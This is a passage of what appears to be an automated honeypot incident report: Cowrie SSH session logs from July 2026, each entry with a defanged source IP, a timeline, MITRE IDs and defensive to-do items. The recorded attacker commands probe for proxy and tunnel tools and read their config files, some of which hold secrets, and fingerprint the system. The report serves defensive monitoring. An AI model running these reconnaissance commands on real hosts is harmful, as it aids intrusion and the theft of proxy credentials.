- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-955d3d51bf38

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:32 |
| **Last Seen** | 2026-07-13 12:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /etc/redsocks.conf 2>/dev/null; cat /etc/redsocks.conf 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:32:48` | `cowrie.session.connect` |
| `2026-07-13 12:32:48` | `cowrie.client.version` |
| `2026-07-13 12:32:49` | `cowrie.client.kex` |
| `2026-07-13 12:32:50` | `cowrie.login.success` |
| `2026-07-13 12:32:51` | `cowrie.client.var` |
| `2026-07-13 12:32:51` | `cowrie.client.var` |
| `2026-07-13 12:32:51` | `cowrie.session.params` |
| `2026-07-13 12:32:51` | `cowrie.command.input` |
| `2026-07-13 12:32:51` | `cowrie.log.closed` |
| `2026-07-13 12:32:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d5acbc9e176

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:32 |
| **Last Seen** | 2026-07-13 12:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/bin/sshuttle 2>/dev/null; ls -la /usr/bin/sshuttle 2>/dev/null; pgrep -af sshuttle 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:32:52` | `cowrie.session.connect` |
| `2026-07-13 12:32:52` | `cowrie.client.version` |
| `2026-07-13 12:32:52` | `cowrie.client.kex` |
| `2026-07-13 12:32:53` | `cowrie.login.success` |
| `2026-07-13 12:32:54` | `cowrie.client.var` |
| `2026-07-13 12:32:54` | `cowrie.client.var` |
| `2026-07-13 12:32:54` | `cowrie.session.params` |
| `2026-07-13 12:32:54` | `cowrie.command.input` |
| `2026-07-13 12:32:54` | `cowrie.log.closed` |
| `2026-07-13 12:32:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-396acc06867d

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:32 |
| **Last Seen** | 2026-07-13 12:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/bin/proxychains 2>/dev/null; ls -la /usr/bin/proxychains 2>/dev/null; pgrep -af proxychains 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:32:55` | `cowrie.session.connect` |
| `2026-07-13 12:32:55` | `cowrie.client.version` |
| `2026-07-13 12:32:56` | `cowrie.client.kex` |
| `2026-07-13 12:32:57` | `cowrie.login.success` |
| `2026-07-13 12:32:58` | `cowrie.client.var` |
| `2026-07-13 12:32:58` | `cowrie.client.var` |
| `2026-07-13 12:32:58` | `cowrie.session.params` |
| `2026-07-13 12:32:58` | `cowrie.command.input` |
| `2026-07-13 12:32:58` | `cowrie.log.closed` |
| `2026-07-13 12:32:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed9f265e05f3

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:32 |
| **Last Seen** | 2026-07-13 12:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /etc/proxychains.conf 2>/dev/null; cat /etc/proxychains.conf 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:32:59` | `cowrie.session.connect` |
| `2026-07-13 12:32:59` | `cowrie.client.version` |
| `2026-07-13 12:32:59` | `cowrie.client.kex` |
| `2026-07-13 12:33:01` | `cowrie.login.success` |
| `2026-07-13 12:33:01` | `cowrie.client.var` |
| `2026-07-13 12:33:01` | `cowrie.client.var` |
| `2026-07-13 12:33:02` | `cowrie.session.params` |
| `2026-07-13 12:33:02` | `cowrie.command.input` |
| `2026-07-13 12:33:02` | `cowrie.log.closed` |
| `2026-07-13 12:33:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b2973a71d8d

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:33 |
| **Last Seen** | 2026-07-13 12:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/bin/tor 2>/dev/null; ls -la /usr/bin/tor 2>/dev/null; pgrep -af tor 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:33:03` | `cowrie.session.connect` |
| `2026-07-13 12:33:03` | `cowrie.client.version` |
| `2026-07-13 12:33:03` | `cowrie.client.kex` |
| `2026-07-13 12:33:04` | `cowrie.login.success` |
| `2026-07-13 12:33:05` | `cowrie.client.var` |
| `2026-07-13 12:33:05` | `cowrie.client.var` |
| `2026-07-13 12:33:05` | `cowrie.session.params` |
| `2026-07-13 12:33:05` | `cowrie.command.input` |
| `2026-07-13 12:33:05` | `cowrie.log.closed` |
| `2026-07-13 12:33:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3af453f27a72

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:33 |
| **Last Seen** | 2026-07-13 12:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /etc/tor/torrc 2>/dev/null; cat /etc/tor/torrc 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:33:06` | `cowrie.session.connect` |
| `2026-07-13 12:33:06` | `cowrie.client.version` |
| `2026-07-13 12:33:07` | `cowrie.client.kex` |
| `2026-07-13 12:33:09` | `cowrie.login.success` |
| `2026-07-13 12:33:09` | `cowrie.client.var` |
| `2026-07-13 12:33:09` | `cowrie.client.var` |
| `2026-07-13 12:33:10` | `cowrie.session.params` |
| `2026-07-13 12:33:10` | `cowrie.command.input` |
| `2026-07-13 12:33:10` | `cowrie.log.closed` |
| `2026-07-13 12:33:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c4473fafeab

| Field | Detail |
|---|---|
| **Source IP** | `178.177.12[.]245` |
| **First Seen** | 2026-07-13 12:33 |
| **Last Seen** | 2026-07-13 12:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo "$(uname -a) -$(cat /proc/cpuinfo | grep 'name' | cut -f2 -d: | uniq -c | sed 's/  */ /g')", uname -a, cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c | sed s/  */ /g` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:33:06` | `cowrie.session.connect` |
| `2026-07-13 12:33:06` | `cowrie.client.version` |
| `2026-07-13 12:33:07` | `cowrie.client.kex` |
| `2026-07-13 12:33:07` | `cowrie.login.success` |
| `2026-07-13 12:33:08` | `cowrie.session.params` |
| `2026-07-13 12:33:08` | `cowrie.command.input` |
| `2026-07-13 12:33:08` | `cowrie.command.input` |
| `2026-07-13 12:33:08` | `cowrie.command.input` |
| `2026-07-13 12:33:08` | `cowrie.log.closed` |
| `2026-07-13 12:33:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.177.12[.]245` to AbuseIPDB if not already reported
- [ ] Block `178.177.12[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b3fcbd9267a

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:33 |
| **Last Seen** | 2026-07-13 12:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/bin/mitmproxy 2>/dev/null; ls -la /usr/bin/mitmproxy 2>/dev/null; pgrep -af mitmproxy 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:33:11` | `cowrie.session.connect` |
| `2026-07-13 12:33:11` | `cowrie.client.version` |
| `2026-07-13 12:33:11` | `cowrie.client.kex` |
| `2026-07-13 12:33:12` | `cowrie.login.success` |
| `2026-07-13 12:33:13` | `cowrie.client.var` |
| `2026-07-13 12:33:13` | `cowrie.client.var` |
| `2026-07-13 12:33:13` | `cowrie.session.params` |
| `2026-07-13 12:33:13` | `cowrie.command.input` |
| `2026-07-13 12:33:13` | `cowrie.log.closed` |
| `2026-07-13 12:33:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dd4a897abbf

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:33 |
| **Last Seen** | 2026-07-13 12:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/bin/mitmdump 2>/dev/null; ls -la /usr/bin/mitmdump 2>/dev/null; pgrep -af mitmdump 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:33:14` | `cowrie.session.connect` |
| `2026-07-13 12:33:14` | `cowrie.client.version` |
| `2026-07-13 12:33:14` | `cowrie.client.kex` |
| `2026-07-13 12:33:15` | `cowrie.login.success` |
| `2026-07-13 12:33:16` | `cowrie.client.var` |
| `2026-07-13 12:33:16` | `cowrie.client.var` |
| `2026-07-13 12:33:16` | `cowrie.session.params` |
| `2026-07-13 12:33:16` | `cowrie.command.input` |
| `2026-07-13 12:33:16` | `cowrie.log.closed` |
| `2026-07-13 12:33:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59f5a320fc2d

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:33 |
| **Last Seen** | 2026-07-13 12:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/bin/ss-server 2>/dev/null; ls -la /usr/bin/ss-server 2>/dev/null; pgrep -af ss-server 2>/dev/null` |
| **TTPs (MITRE)** | T1057 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:33:17` | `cowrie.session.connect` |
| `2026-07-13 12:33:17` | `cowrie.client.version` |
| `2026-07-13 12:33:17` | `cowrie.client.kex` |
| `2026-07-13 12:33:19` | `cowrie.login.success` |
| `2026-07-13 12:33:19` | `cowrie.client.var` |
| `2026-07-13 12:33:19` | `cowrie.client.var` |
| `2026-07-13 12:33:20` | `cowrie.session.params` |
| `2026-07-13 12:33:20` | `cowrie.command.input` |
| `2026-07-13 12:33:20` | `cowrie.log.closed` |
| `2026-07-13 12:33:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0864a226ae2

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:33 |
| **Last Seen** | 2026-07-13 12:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/bin/ss-local 2>/dev/null; ls -la /usr/bin/ss-local 2>/dev/null; pgrep -af ss-local 2>/dev/null` |
| **TTPs (MITRE)** | T1057 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:33:20` | `cowrie.session.connect` |
| `2026-07-13 12:33:20` | `cowrie.client.version` |
| `2026-07-13 12:33:21` | `cowrie.client.kex` |
| `2026-07-13 12:33:22` | `cowrie.login.success` |
| `2026-07-13 12:33:22` | `cowrie.client.var` |
| `2026-07-13 12:33:22` | `cowrie.client.var` |
| `2026-07-13 12:33:23` | `cowrie.session.params` |
| `2026-07-13 12:33:23` | `cowrie.command.input` |
| `2026-07-13 12:33:23` | `cowrie.log.closed` |
| `2026-07-13 12:33:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84182ecd2413

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:33 |
| **Last Seen** | 2026-07-13 12:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /etc/shadowsocks.json 2>/dev/null; cat /etc/shadowsocks.json 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1003.008 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:33:24` | `cowrie.session.connect` |
| `2026-07-13 12:33:24` | `cowrie.client.version` |
| `2026-07-13 12:33:24` | `cowrie.client.kex` |
| `2026-07-13 12:33:25` | `cowrie.login.success` |
| `2026-07-13 12:33:25` | `cowrie.client.var` |
| `2026-07-13 12:33:25` | `cowrie.client.var` |
| `2026-07-13 12:33:26` | `cowrie.session.params` |
| `2026-07-13 12:33:26` | `cowrie.command.input` |
| `2026-07-13 12:33:26` | `cowrie.log.closed` |
| `2026-07-13 12:33:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb319f86c024

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:33 |
| **Last Seen** | 2026-07-13 12:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/bin/v2ray 2>/dev/null; ls -la /usr/bin/v2ray 2>/dev/null; pgrep -af v2ray 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:33:27` | `cowrie.session.connect` |
| `2026-07-13 12:33:27` | `cowrie.client.version` |
| `2026-07-13 12:33:27` | `cowrie.client.kex` |
| `2026-07-13 12:33:28` | `cowrie.login.success` |
| `2026-07-13 12:33:29` | `cowrie.client.var` |
| `2026-07-13 12:33:29` | `cowrie.client.var` |
| `2026-07-13 12:33:29` | `cowrie.session.params` |
| `2026-07-13 12:33:29` | `cowrie.command.input` |
| `2026-07-13 12:33:29` | `cowrie.log.closed` |
| `2026-07-13 12:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d462546652c9

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:33 |
| **Last Seen** | 2026-07-13 12:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /etc/v2ray/config.json 2>/dev/null; cat /etc/v2ray/config.json 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:33:30` | `cowrie.session.connect` |
| `2026-07-13 12:33:30` | `cowrie.client.version` |
| `2026-07-13 12:33:30` | `cowrie.client.kex` |
| `2026-07-13 12:33:31` | `cowrie.login.success` |
| `2026-07-13 12:33:32` | `cowrie.client.var` |
| `2026-07-13 12:33:32` | `cowrie.client.var` |
| `2026-07-13 12:33:33` | `cowrie.session.params` |
| `2026-07-13 12:33:33` | `cowrie.command.input` |
| `2026-07-13 12:33:33` | `cowrie.log.closed` |
| `2026-07-13 12:33:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19ae0c82ead8

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:33 |
| **Last Seen** | 2026-07-13 12:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/bin/clash 2>/dev/null; ls -la /usr/bin/clash 2>/dev/null; pgrep -af clash 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:33:33` | `cowrie.session.connect` |
| `2026-07-13 12:33:33` | `cowrie.client.version` |
| `2026-07-13 12:33:33` | `cowrie.client.kex` |
| `2026-07-13 12:33:35` | `cowrie.login.success` |
| `2026-07-13 12:33:35` | `cowrie.client.var` |
| `2026-07-13 12:33:35` | `cowrie.client.var` |
| `2026-07-13 12:33:36` | `cowrie.session.params` |
| `2026-07-13 12:33:36` | `cowrie.command.input` |
| `2026-07-13 12:33:36` | `cowrie.log.closed` |
| `2026-07-13 12:33:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e1b972954a8

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:33 |
| **Last Seen** | 2026-07-13 12:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /etc/clash/config.yaml 2>/dev/null; cat /etc/clash/config.yaml 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:33:36` | `cowrie.session.connect` |
| `2026-07-13 12:33:36` | `cowrie.client.version` |
| `2026-07-13 12:33:37` | `cowrie.client.kex` |
| `2026-07-13 12:33:38` | `cowrie.login.success` |
| `2026-07-13 12:33:38` | `cowrie.client.var` |
| `2026-07-13 12:33:38` | `cowrie.client.var` |
| `2026-07-13 12:33:39` | `cowrie.session.params` |
| `2026-07-13 12:33:39` | `cowrie.command.input` |
| `2026-07-13 12:33:39` | `cowrie.log.closed` |
| `2026-07-13 12:33:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8121f03dd158

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:33 |
| **Last Seen** | 2026-07-13 12:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/bin/frps 2>/dev/null; ls -la /usr/bin/frps 2>/dev/null; pgrep -af frps 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:33:40` | `cowrie.session.connect` |
| `2026-07-13 12:33:40` | `cowrie.client.version` |
| `2026-07-13 12:33:40` | `cowrie.client.kex` |
| `2026-07-13 12:33:41` | `cowrie.login.success` |
| `2026-07-13 12:33:42` | `cowrie.client.var` |
| `2026-07-13 12:33:42` | `cowrie.client.var` |
| `2026-07-13 12:33:42` | `cowrie.session.params` |
| `2026-07-13 12:33:42` | `cowrie.command.input` |
| `2026-07-13 12:33:42` | `cowrie.log.closed` |
| `2026-07-13 12:33:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b788c53e2b58

| Field | Detail |
|---|---|
| **Source IP** | `111.70.10[.]15` |
| **First Seen** | 2026-07-13 12:33 |
| **Last Seen** | 2026-07-13 12:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:33:42` | `cowrie.session.connect` |
| `2026-07-13 12:33:43` | `cowrie.client.version` |
| `2026-07-13 12:33:43` | `cowrie.client.kex` |
| `2026-07-13 12:33:45` | `cowrie.login.success` |
| `2026-07-13 12:33:46` | `cowrie.direct-tcpip.request` |
| `2026-07-13 12:33:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.10[.]15` to AbuseIPDB if not already reported
- [ ] Block `111.70.10[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-097eb1e640ee

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:33 |
| **Last Seen** | 2026-07-13 12:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/bin/frpc 2>/dev/null; ls -la /usr/bin/frpc 2>/dev/null; pgrep -af frpc 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:33:43` | `cowrie.session.connect` |
| `2026-07-13 12:33:43` | `cowrie.client.version` |
| `2026-07-13 12:33:43` | `cowrie.client.kex` |
| `2026-07-13 12:33:44` | `cowrie.login.success` |
| `2026-07-13 12:33:45` | `cowrie.client.var` |
| `2026-07-13 12:33:45` | `cowrie.client.var` |
| `2026-07-13 12:33:45` | `cowrie.session.params` |
| `2026-07-13 12:33:45` | `cowrie.command.input` |
| `2026-07-13 12:33:45` | `cowrie.log.closed` |
| `2026-07-13 12:33:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8f82e163e64

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:33 |
| **Last Seen** | 2026-07-13 12:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /etc/frp/frpc.ini 2>/dev/null; cat /etc/frp/frpc.ini 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:33:46` | `cowrie.session.connect` |
| `2026-07-13 12:33:46` | `cowrie.client.version` |
| `2026-07-13 12:33:46` | `cowrie.client.kex` |
| `2026-07-13 12:33:47` | `cowrie.login.success` |
| `2026-07-13 12:33:48` | `cowrie.client.var` |
| `2026-07-13 12:33:48` | `cowrie.client.var` |
| `2026-07-13 12:33:48` | `cowrie.session.params` |
| `2026-07-13 12:33:48` | `cowrie.command.input` |
| `2026-07-13 12:33:48` | `cowrie.log.closed` |
| `2026-07-13 12:33:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21d87352f00b

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:33 |
| **Last Seen** | 2026-07-13 12:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /etc/frp/frps.ini 2>/dev/null; cat /etc/frp/frps.ini 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:33:49` | `cowrie.session.connect` |
| `2026-07-13 12:33:49` | `cowrie.client.version` |
| `2026-07-13 12:33:49` | `cowrie.client.kex` |
| `2026-07-13 12:33:51` | `cowrie.login.success` |
| `2026-07-13 12:33:51` | `cowrie.client.var` |
| `2026-07-13 12:33:51` | `cowrie.client.var` |
| `2026-07-13 12:33:52` | `cowrie.session.params` |
| `2026-07-13 12:33:52` | `cowrie.command.input` |
| `2026-07-13 12:33:52` | `cowrie.log.closed` |
| `2026-07-13 12:33:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efe693bcadc0

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:33 |
| **Last Seen** | 2026-07-13 12:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/bin/ngrok 2>/dev/null; ls -la /usr/bin/ngrok 2>/dev/null; pgrep -af ngrok 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:33:52` | `cowrie.session.connect` |
| `2026-07-13 12:33:52` | `cowrie.client.version` |
| `2026-07-13 12:33:52` | `cowrie.client.kex` |
| `2026-07-13 12:33:54` | `cowrie.login.success` |
| `2026-07-13 12:33:54` | `cowrie.client.var` |
| `2026-07-13 12:33:54` | `cowrie.client.var` |
| `2026-07-13 12:33:55` | `cowrie.session.params` |
| `2026-07-13 12:33:55` | `cowrie.command.input` |
| `2026-07-13 12:33:55` | `cowrie.log.closed` |
